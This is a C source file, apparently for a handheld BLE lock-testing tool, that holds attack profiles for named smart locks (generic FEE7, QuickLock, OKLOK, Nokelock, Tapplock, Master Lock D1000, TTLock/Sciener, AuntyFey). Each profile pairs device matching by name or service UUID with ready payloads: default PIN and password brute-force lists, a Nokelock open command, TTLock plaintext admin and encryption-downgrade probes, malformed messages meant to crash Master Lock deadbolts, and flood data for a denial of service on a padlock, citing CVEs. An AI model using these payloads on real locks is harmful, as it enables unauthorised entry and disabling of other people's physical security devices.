#include "lock_tester_profiles.h"
#include <string.h>

// ── Test command data ────────────────────────────────────────────────

// Generic Chinese lock (FEE7) — common default PINs as ASCII
static const uint8_t cmd_000000[] = {'0', '0', '0', '0', '0', '0'};
static const uint8_t cmd_123456[] = {'1', '2', '3', '4', '5', '6'};
static const uint8_t cmd_888888[] = {'8', '8', '8', '8', '8', '8'};
static const uint8_t cmd_666666[] = {'6', '6', '6', '6', '6', '6'};
static const uint8_t cmd_654321[] = {'6', '5', '4', '3', '2', '1'};
static const uint8_t cmd_111111[] = {'1', '1', '1', '1', '1', '1'};
static const uint8_t cmd_000000_bin[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
static const uint8_t cmd_123456_bin[] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06};

// Quicklock — cleartext ASCII password
static const uint8_t cmd_quick_default[] = {'p', 'a', 's', 's', 'w', 'o', 'r', 'd'};
static const uint8_t cmd_quick_1234[] = {'1', '2', '3', '4'};

// Nokelock open command patterns
static const uint8_t cmd_noke_open[] = {0x06, 0x01, 0x01, 0x01};
static const uint8_t cmd_noke_default[] = {0x06, 0x01, 0x00, 0x00, 0x00, 0x00};

// ── Test command lists ───────────────────────────────────────────────

static const LockTestCommand tests_generic_fee7[] = {
    {"PIN: 000000 (ASCII)", cmd_000000, 6},
    {"PIN: 123456 (ASCII)", cmd_123456, 6},
    {"PIN: 888888 (ASCII)", cmd_888888, 6},
    {"PIN: 666666 (ASCII)", cmd_666666, 6},
    {"PIN: 654321 (ASCII)", cmd_654321, 6},
    {"PIN: 111111 (ASCII)", cmd_111111, 6},
    {"PIN: 000000 (binary)", cmd_000000_bin, 6},
    {"PIN: 123456 (binary)", cmd_123456_bin, 6},
};

static const LockTestCommand tests_quicklock[] = {
    {"Default: password", cmd_quick_default, 8},
    {"Default: 1234", cmd_quick_1234, 4},
    {"PIN: 000000", cmd_000000, 6},
    {"PIN: 123456", cmd_123456, 6},
};

static const LockTestCommand tests_oklok[] = {
    {"PIN: 000000", cmd_000000, 6},
    {"PIN: 123456", cmd_123456, 6},
    {"PIN: 888888", cmd_888888, 6},
    {"PIN: 654321", cmd_654321, 6},
    {"PIN: 111111", cmd_111111, 6},
};

static const LockTestCommand tests_nokelock[] = {
    {"Open cmd (default)", cmd_noke_open, 4},
    {"Default session", cmd_noke_default, 6},
    {"PIN: 000000", cmd_000000, 6},
    {"PIN: 123456", cmd_123456, 6},
};

static const LockTestCommand tests_tapplock[] = {
    {"PIN: 000000", cmd_000000, 6},
    {"PIN: 123456", cmd_123456, 6},
    {"PIN: 000000 (bin)", cmd_000000_bin, 6},
};

// Master Lock D1000 — WOOT 2025 replay/DoS attack
// Service: 94e00001-5d5b-11e4-846f-4437e6b36dfb (128-bit, matched by name)
// Malformed message DoS: encoded length 610-656 causes crash
static const uint8_t cmd_mlock_malformed_610[] = {
    0x01, 0x00, 0x02, 0x62, // Header with encoded length 610
    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, // Padding
};
static const uint8_t cmd_mlock_malformed_656[] = {
    0x01, 0x00, 0x02, 0x90, // Header with encoded length 656
    0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
};
static const uint8_t cmd_mlock_keepalive[] = {0x01}; // KeepAlive command

static const LockTestCommand tests_masterlock[] = {
    {"KeepAlive probe", cmd_mlock_keepalive, 1},
    {"Malformed len=610", cmd_mlock_malformed_610, 12},
    {"Malformed len=656", cmd_mlock_malformed_656, 12},
};

// Ttlock / Sciener platform — service UUID 0x1910
// Chars: FFF2 (write no-response), FFF4 (notify)
static const uint8_t cmd_ttlock_admin_check[] = {
    0x7F, 0x5A, 0x05, 0x03, 0x02, 0x00, 0x10, 0x00, 0x22,
    0x41, // admin check opcode
    0x55, // encrypt flag: plaintext
    0x0A, // data length: 10
    0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, // "0000000000" (default adminPs)
    0x00, // checksum placeholder
    0x0D, 0x0A, // terminator
};
static const uint8_t cmd_ttlock_unencrypted_probe[] = {
    0x7F, 0x5A, 0x05, 0x03, 0x02, 0x00, 0x10, 0x00, 0x22,
    0x41, // admin check
    0x55, // plaintext flag
    0x06, // short payload (< 16 bytes, may bypass encryption)
    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, // "123456"
    0xB7, // checksum
    0x0D, 0x0A,
};

static const LockTestCommand tests_ttlock[] = {
    {"Admin check (default)", cmd_ttlock_admin_check, 24},
    {"Plaintext probe", cmd_ttlock_unencrypted_probe, 22},
    {"PIN: 000000", cmd_000000, 6},
    {"PIN: 123456", cmd_123456, 6},
};

// AuntyFey padlock — CVE-2025-34462 connection flood DoS
// Identified by custom service UUID 00000001-0000-1001-8001-00805f9b07d0
static const uint8_t cmd_auntyfey_fuzz1[] = {
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
    0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
    0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
    0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20,
};
static const uint8_t cmd_auntyfey_fuzz2[] = {
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
};

static const LockTestCommand tests_auntyfey[] = {
    {"Random data flood", cmd_auntyfey_fuzz1, 40},
    {"All-FF flood", cmd_auntyfey_fuzz2, 40},
    {"PIN: 000000", cmd_000000, 6},
    {"PIN: 123456", cmd_123456, 6},
};

// ── Lock profiles ────────────────────────────────────────────────────

static const LockProfile profiles[] = {
    {
        .name = "Generic Lock (FEE7)",
        .name_prefix = NULL,
        .service_uuid = 0xFEE7,
        .target_char_uuid = 0,
        .tests = tests_generic_fee7,
        .test_count = 8,
        .description = "Generic Chinese BLE lock\nService: 0xFEE7\nTries common default PINs",
    },
    {
        .name = "QuickLock",
        .name_prefix = "QuickLock",
        .service_uuid = 0,
        .target_char_uuid = 0,
        .tests = tests_quicklock,
        .test_count = 4,
        .description = "QuickLock padlock\nSends cleartext passwords\nKnown vulnerable",
    },
    {
        .name = "OKLOK / Fingerprint",
        .name_prefix = "OKL",
        .service_uuid = 0,
        .target_char_uuid = 0,
        .tests = tests_oklok,
        .test_count = 5,
        .description = "OKLOK / fingerprint locks\nName starts with OKL\nTries default PINs",
    },
    {
        .name = "Nokelock",
        .name_prefix = "NOKE",
        .service_uuid = 0,
        .target_char_uuid = 0,
        .tests = tests_nokelock,
        .test_count = 4,
        .description = "Noke padlock (older models)\nKnown default session tokens\nand command patterns",
    },
    {
        .name = "Tapplock",
        .name_prefix = "TL-",
        .service_uuid = 0,
        .target_char_uuid = 0,
        .tests = tests_tapplock,
        .test_count = 3,
        .description = "Tapplock\nMAC used as crypto key\n(manual key derivation needed)",
    },
    {
        .name = "Master Lock D1000",
        .name_prefix = "Master Lock",
        .service_uuid = 0,
        .target_char_uuid = 0,
        .tests = tests_masterlock,
        .test_count = 3,
        .description = "Master Lock BLE Deadbolt\nWOOT 2025: replay attack\n+ malformed msg DoS",
    },
    {
        .name = "Ttlock / Sciener",
        .name_prefix = "S202",
        .service_uuid = 0x1910,
        .target_char_uuid = 0xFFF2,
        .tests = tests_ttlock,
        .test_count = 4,
        .description = "Ttlock/Sciener platform\nCVE-2023-6960/7003-7017\nEncryption downgrade,\nplaintext cmd processing",
    },
    {
        .name = "AuntyFey Padlock",
        .name_prefix = "AuntyFey",
        .service_uuid = 0,
        .target_char_uuid = 0,
        .tests = tests_auntyfey,
        .test_count = 4,
        .description = "AuntyFey BLE padlock\nCVE-2025-34462\nConnection flood DoS +\nrandom data write flood",
    },
};

// ── Public API ───────────────────────────────────────────────────────

const LockProfile* lock_profiles_get_all(uint8_t* count) {
    *count = LOCK_PROFILE_COUNT;
    return profiles;
}

const LockProfile* lock_profile_match_by_name(const char* device_name) {
    if(!device_name || device_name[0] == '\0') return NULL;

    for(uint8_t i = 0; i < LOCK_PROFILE_COUNT; i++) {
        if(profiles[i].name_prefix) {
            size_t prefix_len = strlen(profiles[i].name_prefix);
            if(strncmp(device_name, profiles[i].name_prefix, prefix_len) == 0) {
                return &profiles[i];
            }
        }
    }
    return NULL;
}

const LockProfile* lock_profile_match_by_service(uint16_t uuid_16) {
    if(uuid_16 == 0) return NULL;

    for(uint8_t i = 0; i < LOCK_PROFILE_COUNT; i++) {
        if(profiles[i].service_uuid == uuid_16) {
            return &profiles[i];
        }
    }
    return NULL;
}

bool lock_tester_parse_adv_name(
    const uint8_t* data,
    uint8_t data_len,
    char* name,
    size_t name_size) {
    uint8_t pos = 0;
    while(pos < data_len) {
        uint8_t len = data[pos];
        if(len == 0 || pos + len >= data_len) break;
        uint8_t type = data[pos + 1];
        if(type == 0x08 || type == 0x09) {
            uint8_t name_len = len - 1;
            if(name_len >= name_size) name_len = name_size - 1;
            memcpy(name, &data[pos + 2], name_len);
            name[name_len] = '\0';
            return true;
        }
        pos += len + 1;
    }
    return false;
}

uint16_t lock_tester_check_adv_services(const uint8_t* data, uint8_t data_len) {
    uint8_t pos = 0;
    while(pos < data_len) {
        uint8_t len = data[pos];
        if(len == 0 || pos + len >= data_len) break;
        uint8_t type = data[pos + 1];

        // 16-bit UUID lists (incomplete or complete)
        if((type == 0x02 || type == 0x03) && len >= 3) {
            for(uint8_t i = 0; i + 1 < len - 1; i += 2) {
                uint16_t uuid = (data[pos + 3 + i] << 8) | data[pos + 2 + i];
                const LockProfile* p = lock_profile_match_by_service(uuid);
                if(p) return uuid;
            }
        }

        // 16-bit service data
        if(type == 0x16 && len >= 3) {
            uint16_t uuid = (data[pos + 3] << 8) | data[pos + 2];
            const LockProfile* p = lock_profile_match_by_service(uuid);
            if(p) return uuid;
        }

        pos += len + 1;
    }
    return 0;
}
